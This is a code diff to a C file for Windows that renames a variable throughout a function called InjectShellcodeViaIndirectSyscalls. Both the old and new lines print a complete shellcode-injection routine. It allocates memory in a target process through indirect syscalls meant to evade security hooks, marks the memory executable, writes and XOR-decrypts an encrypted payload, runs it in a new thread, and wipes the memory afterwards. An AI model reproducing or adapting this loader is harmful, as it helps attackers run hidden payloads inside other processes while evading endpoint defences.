@@ -73,7 +73,7 @@ static VOID XorByOneKey(IN PBYTE pBuffer, IN SIZE_T sBufferSize, IN BYTE bKey) {
 static BOOL InjectShellcodeViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {
 
 	NTSTATUS	STATUS = 0x00;
-	PBYTE		pTmpBaseAddress = NULL;
+	PBYTE		pTmpBuffer = NULL;
 	SIZE_T		sTmpPayloadSize = sShellcodeSize;
 	SIZE_T      sNumberOfBytesWritten = 0x00;
 	DWORD		dwOldProtection = 0x00;
@@ -81,15 +81,15 @@ static BOOL InjectShellcodeViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShe
 	BOOL        bSuccess = FALSE;
 
 	SET_SYSCALL(g_NTAPI.NtAllocateVirtualMemory);
-	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBaseAddress, 0x00, &sTmpPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) || pTmpBaseAddress == NULL) {
+	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBuffer, 0x00, &sTmpPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) || pTmpBuffer == NULL) {
 		printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
 		goto CLEANUP;
 	}
 
-	printf("[+] pTmpBaseAddress : 0x%p \n", pTmpBaseAddress);
+	printf("[+] pTmpBuffer     : 0x%p \n", pTmpBuffer);
 
 	SET_SYSCALL(g_NTAPI.NtProtectVirtualMemory);
-	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBaseAddress, &sTmpPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
+	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBuffer, &sTmpPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
 		printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
 		goto CLEANUP;
 	}
@@ -97,28 +97,28 @@ static BOOL InjectShellcodeViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShe
 	if (hProcess != NtCurrentProcess()) {
 
 		SET_SYSCALL(g_NTAPI.NtWriteVirtualMemory);
-		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, pTmpBaseAddress, pShellcodeAddress, sShellcodeSize, &sNumberOfBytesWritten))) || sNumberOfBytesWritten != sShellcodeSize) {
+		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, pTmpBuffer, pShellcodeAddress, sShellcodeSize, &sNumberOfBytesWritten))) || sNumberOfBytesWritten != sShellcodeSize) {
 			printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
 			goto CLEANUP;
 		}
 	}
 	else
-		memcpy(pTmpBaseAddress, pShellcodeAddress, sShellcodeSize);
+		memcpy(pTmpBuffer, pShellcodeAddress, sShellcodeSize);
 
 	printf("\n[*] Press any key to decrypt... \n");
 	getchar();
 
-	XorByOneKey(pTmpBaseAddress, sShellcodeSize, (BYTE)XOR_KEY);
+	XorByOneKey(pTmpBuffer, sShellcodeSize, (BYTE)XOR_KEY);
 
 	SET_SYSCALL(g_NTAPI.NtCreateThreadEx);
-	if (!NT_SUCCESS((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pTmpBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
+	if (!NT_SUCCESS((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pTmpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
 		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X\n", STATUS);
 		goto CLEANUP;
 	}
 
 	if (phThread) { *phThread = hThread; }
 	
-	*ppInjectionAddress = pTmpBaseAddress;
+	*ppInjectionAddress = pTmpBuffer;
 
 	SET_SYSCALL(g_NTAPI.NtWaitForSingleObject);
 	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, FALSE, NULL)))) {
@@ -129,7 +129,7 @@ static BOOL InjectShellcodeViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShe
 	bSuccess = TRUE;
 
 CLEANUP:
-	if (pTmpBaseAddress) { RtlSecureZeroMemory(pTmpBaseAddress, sTmpPayloadSize); }
+	if (pTmpBuffer) { RtlSecureZeroMemory(pTmpBuffer, sTmpPayloadSize); }
 	if (hThread && hThread != NtCurrentThread()) { CloseHandle(hThread); }
 	if (hProcess && hProcess != NtCurrentProcess()) { CloseHandle(hProcess); }
 	return bSuccess;
